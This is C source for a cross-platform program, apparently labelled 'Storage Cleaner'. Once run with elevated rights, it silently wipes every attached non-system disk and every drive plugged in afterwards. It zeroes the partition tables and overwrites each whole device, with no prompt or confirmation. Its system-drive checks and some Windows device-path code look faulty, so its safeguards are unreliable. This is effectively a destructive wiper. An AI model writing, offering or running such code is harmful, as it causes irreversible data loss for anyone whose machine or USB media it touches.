#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#define WINVER 0x0600
#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <setupapi.h>
#include <winioctl.h>
#include <cfgmgr32.h>
#include <devguid.h>
#include <dbt.h>
#include <process.h>
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "cfgmgr32.lib")
#elif __APPLE__
#include <DiskArbitration/DiskArbitration.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#else
#include <libudev.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <linux/limits.h>
#include <mntent.h>
#endif

#define MAX_RETRIES 3
#define FILL_BUFFER_SIZE (1024 * 1024)

int wipe_device(const char* device_path);
int erase_partition_table(const char* device_path);
int fill_with_zeros(const char* device_path);
int check_permissions();
int device_still_exists(const char* device_path);

#ifdef _WIN32
int is_system_drive_win(const char* device_path);
#elif __APPLE__
int is_system_drive_mac(const char* device_path);
#else
int is_system_drive_linux(const char* device_path);
#endif

#ifdef _WIN32
unsigned __stdcall wipe_device_thread(void* arg);
#else
void* wipe_device_thread(void* arg);
#endif

#ifdef _WIN32
void enumerate_existing_devices_win();
#elif __APPLE__
void enumerate_existing_devices_mac();
#else
void enumerate_existing_devices_linux();
#endif

#ifdef _WIN32
int get_disk_size_win(HANDLE device, unsigned long long* size);
char* get_physical_drive_path(const char* deviceInterfacePath);
void monitor_devices_win();
#elif __APPLE__
void disk_appeared_callback(DADiskRef disk, void* context);
void monitor_devices_mac();
#else
void monitor_devices_linux();
#endif

int main() {
    #ifndef _WIN32
    signal(SIGPIPE, SIG_IGN);
    #endif

    if (!check_permissions()) {
        return 1;
    }

    #ifdef _WIN32
    enumerate_existing_devices_win();
    #elif __APPLE__
    enumerate_existing_devices_mac();
    #else
    enumerate_existing_devices_linux();
    #endif

    #ifdef _WIN32
    monitor_devices_win();
    #elif __APPLE__
    monitor_devices_mac();
    #else
    monitor_devices_linux();
    #endif
    return 0;
}

int check_permissions() {
    #ifdef _WIN32
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return 0;
    }

    TOKEN_ELEVATION elevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated;
    #else
    return geteuid() == 0;
    #endif
}

int device_still_exists(const char* device_path) {
    #ifdef _WIN32
    HANDLE hDevice = CreateFileA(device_path, GENERIC_READ,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return 0;
    }
    CloseHandle(hDevice);
    return 1;
    #else
    int fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        return 0;
    }
    close(fd);
    return 1;
    #endif
}

int wipe_device(const char* device_path) {
    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        if (!device_still_exists(device_path)) {
            return -1;
        }

        if (erase_partition_table(device_path) == 0) {
            if (fill_with_zeros(device_path) == 0) {
                return 0;
            }
        }

        if (attempt < MAX_RETRIES) {
            #ifdef _WIN32
            Sleep(2000);
            #else
            sleep(2);
            #endif
        }
    }
    return -1;
}

int erase_partition_table(const char* device_path) {
    #ifdef _WIN32
    HANDLE hDevice = CreateFileA(device_path, GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return -1;
    }

    char* zero_buffer = (char*)malloc(FILL_BUFFER_SIZE);
    if (!zero_buffer) {
        CloseHandle(hDevice);
        return -1;
    }
    memset(zero_buffer, 0, FILL_BUFFER_SIZE);

    DWORD bytesWritten;

    if (!WriteFile(hDevice, zero_buffer, FILL_BUFFER_SIZE, &bytesWritten, NULL) ||
        bytesWritten != FILL_BUFFER_SIZE) {
        free(zero_buffer);
    CloseHandle(hDevice);
    return -1;
        }

        unsigned long long disk_size = 0;
        if (!get_disk_size_win(hDevice, &disk_size)) {
            free(zero_buffer);
            CloseHandle(hDevice);
            return -1;
        }

        if (disk_size > FILL_BUFFER_SIZE) {
            LARGE_INTEGER pos;
            pos.QuadPart = disk_size - FILL_BUFFER_SIZE;
            SetFilePointerEx(hDevice, pos, NULL, FILE_BEGIN);

            if (!WriteFile(hDevice, zero_buffer, FILL_BUFFER_SIZE, &bytesWritten, NULL) ||
                bytesWritten != FILL_BUFFER_SIZE) {
                free(zero_buffer);
            CloseHandle(hDevice);
            return -1;
                }
        }

        free(zero_buffer);
        CloseHandle(hDevice);

        #else
        int fd = open(device_path, O_WRONLY);
        if (fd == -1) {
            return -1;
        }

        char* zero_buffer = (char*)malloc(FILL_BUFFER_SIZE);
        if (!zero_buffer) {
            close(fd);
            return -1;
        }
        memset(zero_buffer, 0, FILL_BUFFER_SIZE);

        ssize_t bytes_written;
        do {
            bytes_written = write(fd, zero_buffer, FILL_BUFFER_SIZE);
            if (bytes_written == -1 && errno == EINTR) {
                continue;
            }
            if (bytes_written != FILL_BUFFER_SIZE) {
                free(zero_buffer);
                close(fd);
                return -1;
            }
            break;
        } while (1);

        off_t device_size = lseek(fd, 0, SEEK_END);
        if (device_size == -1) {
            free(zero_buffer);
            close(fd);
            return -1;
        }

        if (device_size > FILL_BUFFER_SIZE) {
            if (lseek(fd, device_size - FILL_BUFFER_SIZE, SEEK_SET) == -1) {
                free(zero_buffer);
                close(fd);
                return -1;
            }

            do {
                bytes_written = write(fd, zero_buffer, FILL_BUFFER_SIZE);
                if (bytes_written == -1 && errno == EINTR) {
                    continue;
                }
                if (bytes_written != FILL_BUFFER_SIZE) {
                    free(zero_buffer);
                    close(fd);
                    return -1;
                }
                break;
            } while (1);
        }

        free(zero_buffer);
        close(fd);
        #endif
        return 0;
}

int fill_with_zeros(const char* device_path) {
    #ifdef _WIN32
    HANDLE hDevice = CreateFileA(device_path, GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return -1;
    }

    unsigned long long disk_size = 0;
    if (!get_disk_size_win(hDevice, &disk_size)) {
        CloseHandle(hDevice);
        return -1;
    }

    char* zero_buffer = (char*)malloc(FILL_BUFFER_SIZE);
    if (!zero_buffer) {
        CloseHandle(hDevice);
        return -1;
    }
    memset(zero_buffer, 0, FILL_BUFFER_SIZE);

    DWORD bytesWritten;
    unsigned long long totalWritten = 0;

    while (totalWritten < disk_size) {
        DWORD toWrite = FILL_BUFFER_SIZE;
        if (totalWritten + toWrite > disk_size) {
            toWrite = (DWORD)(disk_size - totalWritten);
        }

        if (!WriteFile(hDevice, zero_buffer, toWrite, &bytesWritten, NULL) ||
            bytesWritten != toWrite) {
            free(zero_buffer);
        CloseHandle(hDevice);
        return -1;
            }

            totalWritten += bytesWritten;
    }

    free(zero_buffer);
    CloseHandle(hDevice);

    #else
    int fd = open(device_path, O_WRONLY);
    if (fd == -1) {
        return -1;
    }

    off_t device_size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    if (device_size == -1) {
        close(fd);
        return -1;
    }

    char* zero_buffer = (char*)malloc(FILL_BUFFER_SIZE);
    if (!zero_buffer) {
        close(fd);
        return -1;
    }
    memset(zero_buffer, 0, FILL_BUFFER_SIZE);

    off_t totalWritten = 0;
    ssize_t bytesWritten;

    while (totalWritten < device_size) {
        size_t toWrite = FILL_BUFFER_SIZE;
        if (totalWritten + toWrite > device_size) {
            toWrite = device_size - totalWritten;
        }

        do {
            bytesWritten = write(fd, zero_buffer, toWrite);
            if (bytesWritten == -1 && errno == EINTR) {
                continue;
            }
            if (bytesWritten <= 0) {
                free(zero_buffer);
                close(fd);
                return -1;
            }
            break;
        } while (1);

        totalWritten += bytesWritten;
    }

    free(zero_buffer);
    close(fd);
    #endif
    return 0;
}

#ifdef _WIN32
int is_system_drive_win(const char* device_path) {
    char system_dir[MAX_PATH];
    if (!GetSystemDirectoryA(system_dir, MAX_PATH)) {
        return 0;
    }

    char system_drive[4] = { system_dir[0], ':', '\\', '\0' };

    char volume_path[MAX_PATH];
    if (!GetVolumeNameForVolumeMountPointA(system_drive, volume_path, MAX_PATH)) {
        return 0;
    }

    HANDLE hVolume = CreateFileA(volume_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hVolume == INVALID_HANDLE_VALUE) {
        return 0;
    }

    STORAGE_DEVICE_NUMBER sdn;
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER,
                                  NULL, 0, &sdn, sizeof(sdn), &bytesReturned, NULL);
    CloseHandle(hVolume);

    if (!result) {
        return 0;
    }

    int drive_number;
    if (sscanf(device_path, "\\\\.\\PhysicalDrive%d", &drive_number) == 1) {
        return drive_number == sdn.DeviceNumber;
    }

    return 0;
}
#elif __APPLE__
int is_system_drive_mac(const char* device_path) {
    struct statfs root_fs;
    if (statfs("/", &root_fs) != 0) {
        return 0;
    }

    char root_device[PATH_MAX];
    if (realpath(root_fs.f_mntfromname, root_device) == NULL) {
        return 0;
    }

    return strcmp(device_path, root_device) == 0;
}
#else
int is_system_drive_linux(const char* device_path) {
    FILE* mntfile = setmntent("/proc/mounts", "r");
    if (!mntfile) {
        return 0;
    }

    struct mntent* mnt;
    char root_device[PATH_MAX] = {0};

    while ((mnt = getmntent(mntfile)) != NULL) {
        if (strcmp(mnt->mnt_dir, "/") == 0) {
            strncpy(root_device, mnt->mnt_fsname, sizeof(root_device) - 1);
            break;
        }
    }
    endmntent(mntfile);

    if (root_device[0] == '\0') {
        return 0;
    }

    char resolved_root_device[PATH_MAX];
    if (realpath(root_device, resolved_root_device) == NULL) {
        return 0;
    }

    char resolved_device[PATH_MAX];
    if (realpath(device_path, resolved_device) == NULL) {
        return 0;
    }

    return strcmp(resolved_device, resolved_root_device) == 0;
}
#endif

#ifdef _WIN32
unsigned __stdcall wipe_device_thread(void* arg) {
    #else
    void* wipe_device_thread(void* arg) {
        #endif
        char* device_path = (char*)arg;
        wipe_device(device_path);
        free(device_path);
        #ifdef _WIN32
        return 0;
        #else
        return NULL;
        #endif
    }

    #ifdef _WIN32
    void enumerate_existing_devices_win() {
        HDEVINFO hDevInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_DISK, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
        if (hDevInfo == INVALID_HANDLE_VALUE) {
            return;
        }

        SP_DEVICE_INTERFACE_DATA interfaceData = {0};
        interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

        for (DWORD i = 0; SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &GUID_DEVINTERFACE_DISK, i, &interfaceData); i++) {
            DWORD requiredSize = 0;
            SetupDiGetDeviceInterfaceDetailA(hDevInfo, &interfaceData, NULL, 0, &requiredSize, NULL);
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                continue;
            }

            PSP_DEVICE_INTERFACE_DETAIL_DATA_A detailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_A)malloc(requiredSize);
            if (!detailData) {
                continue;
            }
            detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);

            SP_DEVINFO_DATA devInfoData = {0};
            devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

            if (SetupDiGetDeviceInterfaceDetailA(hDevInfo, &interfaceData, detailData, requiredSize, NULL, &devInfoData)) {
                char* physicalDrivePath = get_physical_drive_path(detailData->DevicePath);
                if (physicalDrivePath) {
                    if (!is_system_drive_win(physicalDrivePath)) {
                        char* device_path_copy = strdup(physicalDrivePath);
                        HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, wipe_device_thread, device_path_copy, 0, NULL);
                        if (thread) {
                            CloseHandle(thread);
                        } else {
                            free(device_path_copy);
                        }
                    }
                    free(physicalDrivePath);
                }
            }
            free(detailData);
        }

        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    #elif __APPLE__
    void enumerate_existing_devices_mac() {
        DASessionRef session = DASessionCreate(kCFAllocatorDefault);
        if (!session) {
            return;
        }

        CFMutableDictionaryRef match = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                                                                 &kCFTypeDictionaryKeyCallBacks,
                                                                 &kCFTypeDictionaryValueCallBacks);
        if (!match) {
            CFRelease(session);
            return;
        }

        CFDictionarySetValue(match, kDADiskDescriptionMediaWholeKey, kCFBooleanTrue);

        DASessionSetDispatchQueue(session, dispatch_get_main_queue());

        DARegisterDiskAppearedCallback(session, kDADiskDescriptionMatchVolume, disk_appeared_callback, NULL);

        CFRunLoopRun();

        CFRelease(session);
    }
    #else
    void enumerate_existing_devices_linux() {
        struct udev* udev = udev_new();
        if (!udev) {
            return;
        }

        struct udev_enumerate* enumerate = udev_enumerate_new(udev);
        udev_enumerate_add_match_subsystem(enumerate, "block");
        udev_enumerate_add_match_property(enumerate, "DEVTYPE", "disk");
        udev_enumerate_scan_devices(enumerate);

        struct udev_list_entry* devices = udev_enumerate_get_list_entry(enumerate);
        struct udev_list_entry* entry;

        udev_list_entry_foreach(entry, devices) {
            const char* syspath = udev_list_entry_get_name(entry);
            struct udev_device* dev = udev_device_new_from_syspath(udev, syspath);

            if (dev) {
                const char* devnode = udev_device_get_devnode(dev);

                if (devnode) {
                    if (!is_system_drive_linux(devnode)) {
                        char* device_path_copy = strdup(devnode);
                        pthread_t thread;
                        if (pthread_create(&thread, NULL, wipe_device_thread, device_path_copy) == 0) {
                            pthread_detach(thread);
                        } else {
                            free(device_path_copy);
                        }
                    }
                }

                udev_device_unref(dev);
            }
        }

        udev_enumerate_unref(enumerate);
        udev_unref(udev);
    }
    #endif

    #ifdef _WIN32

    int get_disk_size_win(HANDLE device, unsigned long long* size) {
        DISK_GEOMETRY_EX diskGeometry;
        DWORD bytesReturned;

        if (DeviceIoControl(device, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
            NULL, 0, &diskGeometry, sizeof(diskGeometry),
                            &bytesReturned, NULL)) {
            *size = diskGeometry.DiskSize.QuadPart;
        return 1;
                            }

                            return 0;
    }

    char* get_physical_drive_path(const char* deviceInterfacePath) {
        HDEVINFO hDevInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_DISK, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
        if (hDevInfo == INVALID_HANDLE_VALUE) {
            return NULL;
        }

        SP_DEVICE_INTERFACE_DATA interfaceData = {0};
        interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

        for (DWORD i = 0; SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &GUID_DEVINTERFACE_DISK, i, &interfaceData); i++) {
            DWORD requiredSize = 0;
            SetupDiGetDeviceInterfaceDetailA(hDevInfo, &interfaceData, NULL, 0, &requiredSize, NULL);
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                continue;
            }

            PSP_DEVICE_INTERFACE_DETAIL_DATA_A detailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_A)malloc(requiredSize);
            if (!detailData) {
                continue;
            }
            detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);

            SP_DEVINFO_DATA devInfoData = {0};
            devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

            if (SetupDiGetDeviceInterfaceDetailA(hDevInfo, &interfaceData, detailData, requiredSize, NULL, &devInfoData)) {
                if (strcmp(detailData->DevicePath, deviceInterfacePath) == 0) {
                    DWORD diskNumber = 0;
                    DWORD propertyType;
                    DWORD size = sizeof(diskNumber);

                    if (CM_Get_DevNode_PropertyW(devInfoData.DevInst, &DEVPKEY_Device_InstanceId,
                        &propertyType, (PBYTE)&diskNumber, &size, 0) == CR_SUCCESS) {
                        char* path = (char*)malloc(20);
                    if (path) {
                        snprintf(path, 20, "\\\\.\\PhysicalDrive%lu", diskNumber);
                        free(detailData);
                        SetupDiDestroyDeviceInfoList(hDevInfo);
                        return path;
                    }
                        }
                }
            }
            free(detailData);
        }

        SetupDiDestroyDeviceInfoList(hDevInfo);
        return NULL;
    }

    void monitor_devices_win() {
        DEV_BROADCAST_DEVICEINTERFACE notificationFilter;
        HDEVNOTIFY devNotify;
        HWND hwnd = NULL;

        WNDCLASSA wc = {0};
        wc.lpfnWndProc = DefWindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = "StorageCleanerClass";

        RegisterClassA(&wc);
        hwnd = CreateWindowA("StorageCleanerClass", "Storage Cleaner", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);

        ZeroMemory(&notificationFilter, sizeof(notificationFilter));
        notificationFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
        notificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
        notificationFilter.dbcc_classguid = GUID_DEVINTERFACE_DISK;

        devNotify = RegisterDeviceNotification(hwnd, &notificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);

        if (!devNotify) {
            return;
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_DEVICECHANGE) {
                if (msg.wParam == DBT_DEVICEARRIVAL) {
                    DEV_BROADCAST_HDR* broadcastHeader = (DEV_BROADCAST_HDR*)msg.lParam;

                    if (broadcastHeader->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
                        DEV_BROADCAST_DEVICEINTERFACE* broadcastInterface = (DEV_BROADCAST_DEVICEINTERFACE*)broadcastHeader;

                        char* physicalDrivePath = get_physical_drive_path(broadcastInterface->dbcc_name);
                        if (physicalDrivePath) {
                            if (!is_system_drive_win(physicalDrivePath)) {
                                char* device_path_copy = strdup(physicalDrivePath);
                                HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, wipe_device_thread, device_path_copy, 0, NULL);
                                if (thread) {
                                    CloseHandle(thread);
                                } else {
                                    free(device_path_copy);
                                }
                            }
                            free(physicalDrivePath);
                        }
                    }
                    else if (broadcastHeader->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                        DEV_BROADCAST_VOLUME* broadcastVolume = (DEV_BROADCAST_VOLUME*)broadcastHeader;
                        char driveLetter = 'A' + (broadcastVolume->dbcv_unitmask);
                        char devicePath[20];
                        snprintf(devicePath, sizeof(devicePath), "\\\\.\\%c:", driveLetter);

                        if (!is_system_drive_win(devicePath)) {
                            char* device_path_copy = strdup(devicePath);
                            HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, wipe_device_thread, device_path_copy, 0, NULL);
                            if (thread) {
                                CloseHandle(thread);
                            } else {
                                free(device_path_copy);
                            }
                        }
                    }
                }
            }

            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnregisterDeviceNotification(devNotify);
    }

    #elif __APPLE__

    void disk_appeared_callback(DADiskRef disk, void* context) {
        CFStringRef devicePath = DADiskGetBSDName(disk);
        if (devicePath) {
            char bsdName[256];
            if (CFStringGetCString(devicePath, bsdName, sizeof(bsdName), kCFStringEncodingUTF8)) {
                char raw_device[PATH_MAX];
                snprintf(raw_device, sizeof(raw_device), "/dev/%s", bsdName);

                if (!is_system_drive_mac(raw_device)) {
                    char* device_path_copy = strdup(raw_device);
                    pthread_t thread;
                    if (pthread_create(&thread, NULL, wipe_device_thread, device_path_copy) == 0) {
                        pthread_detach(thread);
                    } else {
                        free(device_path_copy);
                    }
                }
            }
        }
    }

    void monitor_devices_mac() {
        DASessionRef session = DASessionCreate(kCFAllocatorDefault);
        if (!session) {
            return;
        }

        DARegisterDiskAppearedCallback(session, NULL, disk_appeared_callback, NULL);

        DASessionScheduleWithRunLoop(session, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
        CFRunLoopRun();

        DASessionUnscheduleFromRunLoop(session, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
        CFRelease(session);
    }

    #else

    void monitor_devices_linux() {
        struct udev* udev = udev_new();
        if (!udev) {
            return;
        }

        struct udev_monitor* mon = udev_monitor_new_from_netlink(udev, "udev");
        udev_monitor_filter_add_match_subsystem_devtype(mon, "block", "disk");
        udev_monitor_enable_receiving(mon);

        int fd = udev_monitor_get_fd(mon);

        while (1) {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(fd, &fds);

            int ret = select(fd + 1, &fds, NULL, NULL, NULL);
            if (ret > 0 && FD_ISSET(fd, &fds)) {
                struct udev_device* dev = udev_monitor_receive_device(mon);
                if (dev) {
                    const char* action = udev_device_get_action(dev);
                    const char* devnode = udev_device_get_devnode(dev);

                    if (action && strcmp(action, "add") == 0 && devnode) {
                        if (!is_system_drive_linux(devnode)) {
                            char* device_path_copy = strdup(devnode);
                            pthread_t thread;
                            if (pthread_create(&thread, NULL, wipe_device_thread, device_path_copy) == 0) {
                                pthread_detach(thread);
                            } else {
                                free(device_path_copy);
                            }
                        }
                    }

                    udev_device_unref(dev);
                }
            }
        }

        udev_monitor_unref(mon);
        udev_unref(udev);
    }

    #endif
